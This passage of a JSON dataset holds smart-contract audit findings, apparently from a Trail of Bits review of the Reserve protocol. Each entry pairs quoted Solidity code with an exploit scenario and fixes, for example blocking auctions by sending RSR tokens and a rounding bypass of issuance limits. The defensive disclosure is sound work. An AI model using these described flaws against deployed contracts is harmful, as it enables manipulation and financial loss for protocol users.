req) = prepareTradeSell(surplus, deficit, surplusAmount);\n    req.minBuyAmount = 0;\n} else {\n    (doTrade, req) = prepareTradeToCoverDeficit(surplus, deficit, surplusAmount, deficitAmount);\n}\n\nif (req.sellAmount == 0) return (false, req);\nreturn (doTrade, req);\n}\n```\n*Figure 9.1: The `nonRSRTrade` function in TradingLib.sol#L229-264*\n\nAfter identifying the `sellAmount` value that should be used to cover the fixed `deficitAmount`, the `prepareTradeToCoverDeficit` function calls `prepareTradeSell`. However, the `minBuyAmount` value returned by the `prepareTradeSell` function may be less than `deficitAmount`. This can occur if `sellAmount` is greater than the maximum trading volume of the asset, an owner-set parameter. In such a case, `sellAmount` will decrease, as will `minBuyAmount` (figure 9.2). If `minBuyAmount` is less than `deficitAmount`, another auction will have to take place to cover the deficit.\n\n```solidity\nfunction prepareTradeSell(\n    IAsset sell,\n    IAsset buy,\n    uint192 sellAmount\n) public view returns (bool notDust, TradeRequest memory trade) {\n    trade.sell = sell;\n    trade.buy = buy;\n    [...]\n    uint192 s = fixMin(sellAmount, sell.maxTradeVolume().div(sell.price(), FLOOR));\n    trade.sellAmount = s.shiftl_toUint(int8(sell.erc20().decimals()), FLOOR);\n    [...]\n    // {buyTok} = {sellTok} * {UoA/sellTok} / {UoA/buyTok}\n    uint192 b = s.mul(FIX_ONE.minus(maxTradeSlippage())).mulDiv(\n        sell.price(),\n        buy.price(),\n        CEIL\n    );\n    trade.minBuyAmount = b.shiftl_toUint(int8(buy.erc20().decimals()), CEIL);\n    [...]\n    return (true, trade);\n}\n```\n\n```solidity\nfunction prepareTradeToCoverDeficit(\n    IAsset sell,\n    IAsset buy,\n    uint192 maxSellAmount,\n    uint192 deficitAmount\n) public view returns (bool notDust, TradeRequest memory trade) {\n    [...]\n    deficitAmount = fixMax(deficitAmount, dustThreshold(buy));\n    // {sellTok} = {buyTok} * {UoA/buyTok} / {UoA/sellTok}\n    uint192 exactSellAmount = deficitAmount.mulDiv(buy.price(), sell.price(), CEIL);\n    [...]\n    uint192 slippedSellAmount = exactSellAmount.div(FIX_ONE.minus(maxTradeSlippage()), CEIL);\n    uint192 sellAmount = fixMin(slippedSellAmount, maxSellAmount);\n    return prepareTradeSell(sell, buy, sellAmount);\n}\n```\n*Figure 9.2: Parts of the `prepareTradeSell` and `prepareTradeToCoverDeficit` functions in TradingLib.sol#L26-94*\n\n## Exploit Scenario\nAlice calls the BackingManager contract to make a trade to cover a deficit in the system. The arithmetic performed in `prepareTradeSell` causes the `sellAmount` to decrease. Thus, the value of `minBuyAmount` also decreases, falling below `deficitAmount`. As a result, the auction does not cover the entire deficit, and additional auctions will have to be held.\n\n## Recommendations\n- Short term: Have `prepareTradeToCoverDeficit` revert if `minBuyAmount` is less than `deficitAmount` after the call to `prepareTradeSell`.\n- Long term: Use dynamic fuzz testing to identify any edge cases that could invalidate system properties.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "TrailOfBits",
      "protocol_name": "Reserve",
      "source_link": "https://github.com/trailofbits/publications/blob/master/reviews/2022-08-reserve-protocol-securityreview.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Felipe Manzano",
        "Anish Naik"
      ]
    },
    {
      "id": "57073",
      "title": "Faulty RToken issuance-cancellation process",
      "impact": "LOW",
      "content": "## Data Validation Issue in RToken Contract\n\n## Difficulty: High\n\n## Type: Data Validation\n\n### Description\n\nDue to incorrect data validation in the issuance-cancellation process, users who wish to cancel some of their issuance requests may end up having all of their issuances canceled.\n\nTo cancel issuance requests, users call the `cancel` function in the RToken contract. The `cancel` function takes two arguments: `endId` and `earliest`. The `earliest` variable indicates whether the user wants to cancel early issuances or later issuances. If `earliest` is true, the `endId` variable indicates the index of the last issuance to be canceled. If `earliest` is false, `endId` indicates the index of the first issuance to be canceled.\n\n```solidity\nfunction cancel(uint256 endId, bool earliest) external interaction {\n    address account = _msgSender();\n    IssueQueue storage queue = issueQueues[account];\n    require(queue.left <= endId && endId <= queue.right, \"'endId' is out of range\");\n    // == Interactions ==\n    if (earliest) {\n        refundSpan(account, queue.left, endId);\n    } else {\n        refundSpan(account, endId, queue.right);\n    }\n}\n```\n\n*Figure 8.1: The cancel function in RToken.sol#L273-285*\n\nThe `cancel` function internally calls the `refundSpan` function. The `refundSpan` function refunds the user for all issuances in the range of indexes `[left, right)`.\n\n```solidity\nfunction refundSpan(\n    address account,\n    uint256 left,\n    uint256 right\n) private {\n    if (left >= right) return; // refund an empty span\n    IssueQueue storage queue = issueQueues[account];\n    // compute total deposits to refund\n    uint256 tokensLen = queue.tokens.length;\n    uint256[] memory amt = new uint256[](tokensLen);\n    IssueItem storage rightItem = queue.items[right - 1];\n    // we could dedup this logic but it would take more SLOADS, so I think this is best\n    if (queue.left == 0) {\n        for (uint256 i = 0; i < tokensLen; ++i) {\n            amt[i] = rightItem.deposits[i];\n        }\n    } else {\n        IssueItem storage leftItem = queue.items[queue.left - 1];\n        for (uint256 i = 0; i < tokensLen; ++i) {\n            amt[i] = rightItem.deposits[i] - leftItem.deposits[i];\n        }\n    }\n    [...]\n}\n```\n\n*Figure 8.2: Part of the refundSpan function in RToken.sol#L401-445*\n\nHowever, instead of using the `left` input variable, `refundSpan` uses `queue.left`, which is the first issuance in the queue array that can be canceled. On the other hand, when `earliest` is false, `endId` (i.e., `left`) points to the first issuance that the user wants to cancel. Note that `left` does not have to be equal to `queue.left`; `left` could instead be greater than `queue.left`. Thus, a user who wishes to cancel issuance requests in the range of `[left, right)` may actually be refunded for those in the range of `[queue.left, right)`, where `left` is greater than `queue.left`.\n\n### Exploit Scenario\n\nAlice has five outstanding issuances and wishes to cancel the issuances in the range of indexes `[3, 5)`. However, due to the incorrect use of the `left` input variable in `refundSpan`, Alice is refunded for the issuance requests in the range of indexes `[0, 5)` — that is, all of her issuance requests. Since none of the RToken issuances successfully finished, Alice must make an additional gas payment to restart the process.\n\n### Recommendations\n\n- **Short term**: Replace all uses of `queue.left` in `refundSpan` with `left`.\n- **Long term**: Expand the unit test suite to cover additional edge cases and ensure that the system behaves as expected.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "TrailOfBits",
      "protocol_name": "Reserve",
      "source_link": "https://github.com/trailofbits/publications/blob/master/reviews/2022-08-reserve-protocol-securityreview.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Felipe Manzano",
        "Anish Naik"
      ]
    },
    {
      "id": "57072",
      "title": "Fallen-target auctions can be prevented from occurring",
      "impact": "LOW",
      "content": "## Diﬃculty: Medium\n\n## Type: Data Validation\n\n## Description\nBy sending enough RSR tokens to the BackingManager contract, a user could prevent the contract from considering any other asset to be in surplus; when there is no asset in surplus, the protocol is unable to hold a fallen-target token auction. However, this would be possible only if an attempt to seize RSR failed or if the Reserve team changed the recapitalization strategy to attempt a fallen-target auction before an RSR seizure.\n\nA fallen-target token auction is the protocol’s second-to-last resort when it is attempting to recapitalize the system without directly compromising the number of underlying BUs. The TradingLib library’s `largestSurplusAndDeficit` function determines which asset should be sold (i.e., which asset is the most in surplus) and which asset should be bought (i.e., which has the largest deficit). In this function, the `basketTop` value represents the BU threshold that determines whether an asset is in surplus. If a token has a balance sufficient to represent at least `basketTop` BUs, it is in surplus (Figure 7.1).\n\n```\nfunction largestSurplusAndDeficit(bool useFallenTarget)\npublic\nview\nreturns (\n    IAsset surplus,\n    ICollateral deficit,\n    uint192 sellAmount,\n    uint192 buyAmount\n)\n{\n    IERC20[] memory erc20s = assetRegistry().erc20s();\n    // Compute basketTop and basketBottom\n    // basketTop is the lowest number of BUs to which we'll try to sell surplus assets\n    // basketBottom is the greatest number of BUs to which we'll try to buy deficit assets\n    uint192 basketTop = rToken().basketsNeeded(); // {BU}\n    uint192 basketBottom = basketTop; // {BU}\n    if (useFallenTarget) {\n        uint192 tradeVolume; // {UoA}\n        uint192 totalValue; // {UoA}\n        for (uint256 i = 0; i < erc20s.length; ++i) {\n            IAsset asset = assetRegistry().toAsset(erc20s[i]);\n            // Ignore dust amounts for assets not in the basket\n            uint192 bal = asset.bal(address(this)); // {tok}\n            if (basket().quantity(erc20s[i]).gt(FIX_ZERO) || bal.gt(dustThreshold(asset))) {\n                // {UoA} = {UoA} + {UoA/tok} * {tok}\n                totalValue = totalValue.plus(asset.price().mul(bal, FLOOR));\n            }\n        }\n        basketTop = totalValue.div(basket().price(), CEIL);\n        [...]\n    }\n    uint192 maxSurplus; // {UoA}\n    uint192 maxDeficit; // {UoA}\n    for (uint256 i = 0; i < erc20s.length; ++i) {\n        if (erc20s[i] == rsr()) continue; // do not consider RSR\n        IAsset asset = assetRegistry().toAsset(erc20s[i]);\n        uint192 bal = asset.bal(address(this));\n        // Token Threshold - top\n        uint192 tokenThreshold = basketTop.mul(basket().quantity(erc20s[i]), CEIL); // {tok};\n        if (bal.gt(tokenThreshold)) {\n            // {UoA} = ({tok} - {tok}) * {UoA/tok}\n            uint192 deltaTop = bal.minus(tokenThreshold).mul(asset.price(), FLOOR);\n            if (deltaTop.gt(maxSurplus)) {\n                surplus = asset;\n                maxSurplus = deltaTop;\n                // {tok} = {UoA} / {UoA/tok}\n                sellAmount = maxSurplus.div(surplus.price());\n                if (bal.lt(sellAmount)) sellAmount = bal;\n            }\n        } else {\n            [...]\n        }\n    }\n}\n```\n\nFigure 7.1: The `largestSurplusAndDeficit` function in `TradingLib.sol#L102-192`\n\nHowever, the `basketTop` value can be artificially manipulated because it incorporates the value of all assets, including the RSR token, but there is no check of whether the RSR token is the one most in surplus. Thus, if the RSR balance is large enough, the value of `basketTop` can increase such that none of the other assets or collateral held by the BackingManager contract (including the RToken) will have a balance large enough to represent `basketTop` BUs. Then, without an asset in surplus, it will be impossible to launch a fallen-target token auction; instead, the BackingManager contract will call the `compromiseBasketsNeeded` function to compromise the number of BUs held by the contract, effectively decreasing the value of the RToken.\n\n## Exploit Scenario\nEve notices that there is an RToken with a deficit that is large enough to warrant a fallen-target token auction. She sends a large quantity of RSR tokens to the BackingManager contract. The transaction inflates the `basketTop` value in the `largestSurplusAndDeficit` function such that no other token in the BackingManager contract can be in surplus. As a result, the BackingManager contract must call `compromiseBasketsNeeded` to attempt to recapitalize the system.\n\n## Recommendations\n- **Short term:** Omit the BackingManager contract’s balance of RSR tokens from the `totalValue` calculation.\n- **Long term:** Ensure that token airdrops can only benefit (not harm) the system and that they do not lead to unexpected system behavior.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "TrailOfBits",
      "protocol_name": "Reserve",
      "source_link": "https://github.com/trailofbits/publications/blob/master/reviews/2022-08-reserve-protocol-securityreview.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Felipe Manzano",
        "Anish Naik"
      ]
    },
    {
      "id": "57071",
      "title": "All attempts to initiate auctions of defaulted collateral tokens will fail",
      "impact": "HIGH",
      "content": "## Diﬃculty: High\n\n## Type: Data Validation\n\n### Description\nWhen collateral tokens default, they can be sold through an auction in exchange for backup collateral tokens. However, any attempt to initiate such an auction will fail, causing the protocol to remain undercapitalized.\n\nA collateral token defaults when its price falls below a certain target for a set period of time. To make the RToken whole again, the owner of the RToken will “switch” the defaulted collateral token for a backup collateral token by calling the `BasketHandler.refreshBasket` function. The `BackingManager.manageTokens` function will then execute the recapitalization strategy (Figure 6.1).\n\n```solidity\nfunction manageTokens(IERC20[] calldata erc20s) external interaction {\n    // == Refresh ==\n    main.assetRegistry().refresh();\n    if (tradesOpen > 0) return;\n    // Do not trade when DISABLED or IFFY\n    require(main.basketHandler().status() == CollateralStatus.SOUND, \"basket not sound\");\n    (, uint256 basketTimestamp) = main.basketHandler().lastSet();\n    if (block.timestamp < basketTimestamp + tradingDelay) return;\n    if (main.basketHandler().fullyCapitalized()) {\n        // == Interaction (then return) ==\n        handoutExcessAssets(erc20s);\n        return;\n    } else {\n        bool doTrade;\n        TradeRequest memory req;\n        // 1a\n        (doTrade, req) = TradingLibP1.nonRSRTrade(false);\n        // 1b\n        if (!doTrade) (doTrade, req) = TradingLibP1.rsrTrade();\n        // 2\n        if (!doTrade) (doTrade, req) = TradingLibP1.nonRSRTrade(true);\n        // 3\n        if (!doTrade) {\n            compromiseBasketsNeeded();\n            return;\n        }\n        // == Interaction ==\n        if (doTrade) tryTrade(req);\n    }\n}\n```\n\n**Figure 6.1:** The `manageTokens` function in `BackingManager.sol#L49-105`\n\nThe first recapitalization strategy involves a call to the `nonRSRTrade` function in the TradingLib library. The function will create a `TradeRequest` object and use it to initiate an auction in which the defaulted collateral will be sold in exchange for as much backup collateral as possible on the open market (Figure 6.2).\n\n```solidity\nfunction nonRSRTrade(bool useFallenTarget)\n    external\n    view\n    returns (bool doTrade, TradeRequest memory req)\n{\n    (\n        IAsset surplus,\n        ICollateral deficit,\n        uint192 surplusAmount,\n        uint192 deficitAmount\n    ) = largestSurplusAndDeficit(useFallenTarget);\n    if (address(surplus) == address(0) || address(deficit) == address(0)) return (false, req);\n    // Of primary concern here is whether we can trust the prices for the assets we are selling.\n    // If we cannot, then we should ignore `maxTradeSlippage`.\n    if (\n        surplus.isCollateral() &&\n        assetRegistry().toColl(surplus.erc20()).status() == CollateralStatus.DISABLED\n    ) {\n        (doTrade, req) = prepareTradeSell(surplus, deficit, surplusAmount);\n        req.minBuyAmount = 0;\n    } else {\n        [...]\n    }\n    [...]\n    return (doTrade, req);\n}\n```\n\n**Figure 6.2:** Part of the `nonRSRTrade` function in `TradingLib.sol#L229-264`\n\nHowever, the `EasyAuction` contract, which is used downstream to manage auctions, will prevent the creation of the auction. This is because `req.minBuyAmount` is set to zero in `nonRSRTrade`, while `EasyAuction` requires that `_minBuyAmount` be greater than zero (Figure 6.3).\n\n```solidity\nfunction initiateAuction(\n    IERC20 _auctioningToken,\n    IERC20 _biddingToken,\n    uint256 orderCancellationEndDate,\n    uint256 auctionEndDate,\n    uint96 _auctionedSellAmount,\n    uint96 _minBuyAmount,\n    uint256 minimumBiddingAmountPerOrder,\n    uint256 minFundingThreshold,\n    bool isAtomicClosureAllowed,\n    address accessManagerContract,\n    bytes memory accessManagerContractData\n) public returns (uint256) {\n    [...]\n    require(_minBuyAmount > 0, \"tokens cannot be auctioned for free\");\n    [...]\n}\n```\n\n**Figure 6.3:** Part of the `initiateAuction` function in `EasyAuction.sol#L152-227`\n\nWhile there exist other options for recapitalizing the system, such as seizing RSR tokens and compromising the number of basket units (BUs) backing the RToken, the system will always try the above approach first. However, the transaction will always revert, and the system will not try any of the other options.\n\n### Exploit Scenario\nA collateral token backing the RToken depreciates in value and consequently enters a default state. The owner of the RToken switches the underlying basket and calls the `BackingManager` contract to begin the process of auctioning off all defaulted collateral tokens and buying backup collateral tokens. However, because the `EasyAuction.initiateAuction` function requires that `req.minBuyAmount` be greater than zero, the initiation of the auction fails. Moreover, because the system cannot attempt to execute any other recapitalization mechanisms, the RToken remains undercapitalized.\n\n### Recommendations\n**Short term:** Consider either removing the line of code in which `req.minBuyAmount` is set to zero or setting `req.minBuyAmount` to one.\n\n**Long term:** Ensure that all mock contracts that are used for testing closely resemble the corresponding original contracts. The `GnosisMock` contract does not include the check of `_minBuyAmount` and thus allows all associated unit tests to pass.",
      "summary": "\nThis bug report discusses a high difficulty issue related to data validation in the protocol. When a collateral token's price falls below a certain target, it defaults and can be sold through an auction for backup collateral tokens. However, attempts to initiate this auction fail, leaving the protocol undercapitalized.\n\nThe issue lies in the `BackingManager.manageTokens` function, where the recapitalization strategy is executed. The first strategy involves calling the `nonRSRTrade` function, which creates a `TradeRequest` object and initiates an auction. However, the `EasyAuction` contract, used to manage auctions, will not allow the auction to be created if the `req.minBuyAmount` is set to zero. This is a problem because the `nonRSRTrade` function sets `req.minBuyAmount` to zero, causing the auction to fail and leaving the protocol undercapitalized.\n\nThis bug can be exploited if a collateral token backing the RToken depreciates in value and enters a default state. The owner of the RToken will switch the underlying basket and attempt to auction off defaulted collateral tokens, but the auction will fail due to the `req.minBuyAmount` issue. Since the system cannot attempt any other recapitalization mechanisms, the RToken will remain undercapitalized.\n\nThe recommended short-term solution is to remove the line of code setting `req.minBuyAmount` to zero or change it to one. In the long term, it is important to ensure that all mock contracts used for testing closely resemble the original contracts to avoid similar issues. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "TrailOfBits",
      "protocol_name": "Reserve",
      "source_link": "https://github.com/trailofbits/publications/blob/master/reviews/2022-08-reserve-protocol-securityreview.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Felipe Manzano",
        "Anish Naik"
      ]
    },
    {
      "id": "57070",
      "title": "Per-block issuance limit can be bypassed",
      "impact": "LOW",
      "content": "## Reserve Protocol Security Assessment\n\n## Difficulty: Low\n\n## Type: Data Validation\n\n## Description\n\nBecause of a rounding error in a division operation, the per-block issuance limit can be bypassed.\n\nThe protocol imposes a delay on large RToken issuances to prevent rapid inflation of the RToken supply and to prevent attacks that can be executed when a collateral token defaults. For example, if a user wishes to mint 1 million RTokens and the maximum issuance per block is 25,000 RTokens, it will take 40 blocks for the issuance to finish. The `whenFinished` function in the RToken contract determines the number of blocks it will take for an issuance to finish. The number of RTokens that need to be minted, `amtRToken`, is divided by the per-block issuance rate, `lastIssRate`. As long as the total of all `amtRToken` values across all issuances in a block is less than `lastIssRate`, the issuance will happen in the same block as the request.\n\n```solidity\nfunction whenFinished(uint256 amtRToken) private returns (uint192 finished) {\n    // Calculate the issuance rate (if this is the first issuance in the block)\n    if (lastIssRateBlock < block.number) {\n        lastIssRateBlock = block.number;\n        lastIssRate = uint192((issuanceRate * totalSupply()) / FIX_ONE);\n        if (lastIssRate < MIN_ISS_RATE) lastIssRate = MIN_ISS_RATE;\n    }\n    // Add amtRToken's worth of issuance delay to allVestAt\n    uint192 before = allVestAt; // D18{block number}\n    uint192 worst = uint192(FIX_ONE * (block.number - 1)); // D18{block number}\n    if (worst > before) before = worst;\n    finished = before + uint192((FIX_ONE_256 * amtRToken) / lastIssRate);\n    allVestAt = finished;\n}\n```\n\n*Figure 5.1: The whenFinished function in RToken.sol#L202-216*\n\nHowever, because of a rounding error, the total `amtRToken` value can be greater than `lastIssRate`. If `lastIssRate` is 10,000 whole tokens (1 whole token is 10^18 tokens) and the current total is 1 token less than 10,000 whole tokens, a user will be able to mint 9,999 tokens without causing `finished` to increase. Then, because `finished` has not increased, the issuance will be atomic, but the total number of minted RTokens will be greater than `lastIssRate`.\n\n## Recommendations\n\n- **Short term**: Consider implementing a one-block delay for all token issuances.\n- **Long term**: Use dynamic fuzz testing to identify any edge cases that could invalidate system properties.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "TrailOfBits",
      "protocol_name": "Reserve",
      "source_link": "https://github.com/trailofbits/publications/blob/master/reviews/2022-08-reserve-protocol-securityreview.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Felipe Manzano",
        "Anish Naik"
      ]
    },
    {
      "id": "57069",
      "title": "All auction initiation attempts may fail",
      "impact": "HIGH",
      "content": "## Security Assessment Report\n\n## Difficulty: High\n\n## Type: Data Validation\n\n### Description\nThe token auction platform used by the Reserve protocol, the Gnosis Auction platform, may not be provided with a large enough allowance of the token to be auctioned. As of this writing, the fee imposed by the EasyAuction contract is set to zero. However, if the owner of the EasyAuction contract changes the fee, this issue will immediately pose a severe risk, as it will prevent any auctions from occurring.\n\nThe Reserve protocol relies on token auctions to increase the value of an RToken, to increase the amount of rewards paid to RSR stakers, and to recapitalize the system if one or more collateral tokens have defaulted.\n\nThe GnosisTrade contract initiates auctions by calling the `initiateAuction` function in the EasyAuction contract (an external Gnosis-created contract). Before calling `initiateAuction`, the GnosisTrade contract approves the EasyAuction contract to transfer `sellAmount` of sell tokens (Figure 4.1). This allows the `initiateAuction` function to transfer the number of sell tokens necessary for it to start the auction.\n\n```solidity\nfunction init(\n    IBroker broker_,\n    address origin_,\n    IGnosis gnosis_,\n    uint32 auctionLength,\n    uint256 minBidSize,\n    TradeRequest memory req\n) external stateTransition(TradeStatus.NOT_STARTED, TradeStatus.OPEN) {\n    // == Interactions ==\n    IERC20Upgradeable(address(sell)).safeIncreaseAllowance(address(gnosis), sellAmount);\n    \n    auctionId = gnosis.initiateAuction(\n        sell,\n        buy,\n        endTime,\n        endTime,\n        uint96(sellAmount),\n        uint96(req.minBuyAmount),\n        minBidSize,\n        req.minBuyAmount, // TODO to double-check this usage of gnosis later\n        false,\n        address(0),\n        new bytes(0)\n    );\n}\n```\n*Figure 4.1: Part of the init function in `GnosisTrade.sol#L53-94`*\n\nHowever, the number of sell tokens that need to be transferred from the GnosisTrade contract to the EasyAuction contract is actually more than the `sellAmount`. This is because the EasyAuction contract takes a fee, which is capped at 1.5%, in exchange for running the auction (Figure 4.2). Thus, the token allowance may be insufficient and cause the `initiateAuction` call to revert.\n\n```solidity\nfunction initiateAuction(\n    IERC20 _auctioningToken,\n    IERC20 _biddingToken,\n    uint256 orderCancellationEndDate,\n    uint256 auctionEndDate,\n    uint96 _auctionedSellAmount,\n    uint96 _minBuyAmount,\n    uint256 minimumBiddingAmountPerOrder,\n    uint256 minFundingThreshold,\n    bool isAtomicClosureAllowed,\n    address accessManagerContract,\n    bytes memory accessManagerContractData\n) public returns (uint256) {\n    // withdraws sellAmount + fees\n    _auctioningToken.safeTransferFrom(\n        msg.sender,\n        address(this),\n        _auctionedSellAmount.mul(FEE_DENOMINATOR.add(feeNumerator)).div(FEE_DENOMINATOR) //[0]\n    );\n    // [...]\n}\n```\n*Figure 4.2: Part of the initiateAuction function in `EasyAuction.sol#L152-227`*\n\n### Exploit Scenario\nThe protocol initiates an auction to sell COMP tokens in exchange for RTokens. However, because the EasyAuction contract’s token allowance is insufficient, the call to `initiateAuction` reverts, and the token auction does not occur.\n\n### Recommendations\n**Short term:** Create a `uint256` value called `actualSellAmount` (or a similar name) that is equal to `sellAmount` divided by 1 plus the EasyAuction fee. Have the GnosisTrade contract call `initiateAuction` with `actualSellAmount` instead of `sellAmount`, but continue to approve the EasyAuction contract to transfer `sellAmount`.\n\n**Long term:** Ensure that all mock contracts that are used for testing closely resemble the corresponding original contracts. Additionally, ensure that all upstream computations that rely on `sellAmount` are updated to account for the fee.",
      "summary": "\nThis bug report discusses a potential security issue with the token auction platform used by the Reserve protocol. The issue is related to insufficient token allowance, which may prevent auctions from occurring if the owner of the EasyAuction contract changes the fee. This could have negative effects on the value of RToken, rewards paid to RSR stakers, and the system's capitalization. The report suggests short-term and long-term solutions to address the issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "TrailOfBits",
      "protocol_name": "Reserve",
      "source_link": "https://github.com/trailofbits/publications/blob/master/reviews/2022-08-reserve-protocol-securityreview.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Felipe Manzano",
        "Anish Naik"
      ]
    },
    {
      "id": "57068",
      "title": "Unbounded and invalidly bounded system parameters may cause undeﬁned behavior",
      "impact": "MEDIUM",
      "content": "## Reserve Protocol Security Assessment\n\n## Diﬃculty: Low\n\n## Type: Data Validation\n\n### Description\n\nMany system parameters are unbounded or are bounded incorrectly; this increases the risk of undefined system behavior. For example, when the `BasketHandler` contract creates the target basket configuration, it does not check that the target weight for each collateral token is bounded between 0 and 1,000 (figure 3.1). According to the documentation, a target weight that is not in this range can cause unexpected reverts.\n\n```solidity\nfunction setPrimeBasket(IERC20[] calldata erc20s, uint192[] calldata targetAmts)\nexternal\ngovernance\n{\n    // withLockable not required: no external calls\n    require(erc20s.length == targetAmts.length, \"must be same length\");\n    delete config.erc20s;\n    IAssetRegistry reg = main.assetRegistry();\n    bytes32[] memory names = new bytes32[](erc20s.length);\n    for (uint256 i = 0; i < erc20s.length; ++i) {\n        // This is a nice catch to have, but in general it is possible for\n        // an ERC20 in the prime basket to have its asset unregistered.\n        // In that case the basket is set to disabled.\n        require(reg.toAsset(erc20s[i]).isCollateral(), \"token is not collateral\");\n        config.erc20s.push(erc20s[i]);\n        config.targetAmts[erc20s[i]] = targetAmts[i];\n        names[i] = reg.toColl(erc20s[i]).targetName();\n        config.targetNames[erc20s[i]] = names[i];\n    }\n    emit PrimeBasketSet(erc20s, targetAmts, names);\n}\n```\n*Figure 3.1: The setPrimeBasket function in BasketHandler.sol#L128-151*\n\nSimilarly, the `Distributor` contract expects the revenue share values of the `StRSR` contract’s reward pool and the `Furnace` contract to be between 0 and 10,000 (figure 3.2). However, a revenue share value of 0 for the `StRSR` or `Furnace` contract would prevent the payout of rewards to RSR stakers or result in inflation of the RToken supply, respectively.\n\n```solidity\nfunction _setDistribution(address dest, RevenueShare memory share) internal {\n    if (dest == FURNACE) require(share.rsrDist == 0, \"Furnace must get 0% of RSR\");\n    if (dest == ST_RSR) require(share.rTokenDist == 0, \"StRSR must get 0% of RToken\");\n    require(share.rsrDist <= 10000, \"RSR distribution too high\");\n    require(share.rTokenDist <= 10000, \"RToken distribution too high\");\n    destinations.add(dest);\n    distribution[dest] = share;\n    emit DistributionSet(dest, share.rTokenDist, share.rsrDist);\n}\n```\n*Figure 3.2: The _setDistribution function in Distributor.sol#L114-123*\n\nThere are many other governance/owner-set parameters that have undefined bounds:\n- BackingManager.backingBuffer()\n- BackingManager.tradingDelay()\n- BackingManager.dustAmount()\n- BackingManager.maxTradeSlippage()\n- Broker.auctionLength()\n- Broker.minBidSize()\n- Furnace.ratio()\n- Furnace.period()\n- RevenueTrader.dustAmount()\n- RevenueTrader.maxTradeSlippage()\n- RToken.issuanceRate()\n- StRSR.rewardRatio()\n\n### Exploit Scenario\n\nAlice uses the `Deployer` contract to create an RToken. However, she incorrectly sets the revenue share value for the `Furnace` contract to 0. All underlying collateral tokens appreciate in value, which triggers the minting and subsequent melting of RTokens. Because the revenue share value is set to 0, no RTokens are transferred to the `Furnace` contract; this inflates the total supply of RTokens.\n\n### Recommendations\n\nShort term, create a lower and upper bound for all governance/owner-controlled state variables, and validate each state variable’s bounds when performing updates.\n\nLong term, use dynamic testing to check whether the bounds of each parameter hold and are sensible in various system states.",
      "summary": "\nThis bug report is about a security assessment for the Reserve Protocol. It has been classified as a low difficulty issue related to data validation. The report highlights that many system parameters do not have defined boundaries, which can lead to unexpected behavior. For example, the `BasketHandler` contract does not check if the target weight for each collateral token is between 0 and 1,000, which can cause unexpected reverts. Similarly, the `Distributor` contract expects the revenue share values for certain contracts to be between 0 and 10,000, but a value of 0 can cause issues with rewards and inflation. The report also lists other parameters that do not have defined boundaries. \n\nThe report suggests creating lower and upper bounds for all governance/owner-controlled state variables and validating them when updates are made. In the long term, dynamic testing should be used to ensure that the boundaries for each parameter are sensible in different system states. The report also includes an exploit scenario where an incorrect revenue share value for the `Furnace` contract leads to the inflation of RTokens. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "TrailOfBits",
      "protocol_name": "Reserve",
      "source_link": "https://github.com/trailofbits/publications/blob/master/reviews/2022-08-reserve-protocol-securityreview.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Felipe Manzano",
        "Anish Naik"
      ]
    },
    {
      "id": "57067",
      "title": "Lack of a two-step process for contract ownership changes",
      "impact": "HIGH",
      "content": "## Reserve Protocol Security Assessment\n\n## Diﬃculty: High\n\n## Type: Data Validation\n\n## Description\nThe Main contract inherits from OpenZeppelin’s OwnableUpgradeable contract, which provides a basic access control mechanism. However, to perform contract ownership changes, the OwnableUpgradeable contract internally calls the `_transferOwnership()` function, which immediately sets the new owner of the contract. Making such a critical change in a single step is error-prone and can lead to irrevocable mistakes.\n\n```solidity\nfunction _transferOwnership(address newOwner) internal virtual {\n    address oldOwner = _owner;\n    _owner = newOwner;\n    emit OwnershipTransferred(oldOwner, newOwner);\n}\n```\n*Figure 2.1: The `_transferOwnership` function in OwnableUpgradeable.sol#L76-80*\n\n## Exploit Scenario\nAlice, the owner of the Reserve protocol Main contract, calls `transferOwnership()` but accidentally enters the wrong address as the new owner address. As a result, she permanently loses access to the contract.\n\n## Recommendations\n- **Short term:** Perform ownership transfers through a two-step process in which the owner proposes a new address and the transfer is completed once the new address has executed a call to accept the role.\n- **Long term:** Identify and document all possible actions that can be taken by privileged accounts and their associated risks. This will facilitate reviews of the codebase and prevent future mistakes.\n\n---\n\n*Trail of Bits*  \n*Reserve Protocol Security Assessment*  \n*PUBLIC*",
      "summary": "\nThis bug report is about a potential security issue in the Reserve Protocol, which is a type of software used to manage financial transactions. The problem is related to how the software handles changes in ownership, which can be a critical and irreversible action. The report suggests that the current method of transferring ownership is risky and can lead to mistakes. The report also provides recommendations for short-term and long-term solutions to address this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "TrailOfBits",
      "protocol_name": "Reserve",
      "source_link": "https://github.com/trailofbits/publications/blob/master/reviews/2022-08-reserve-protocol-securityreview.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Felipe Manzano",
        "Anish Naik"
      ]
    },
    {
      "id": "57066",
      "title": "Solidity compiler optimizations can be problematic",
      "impact": "LOW",
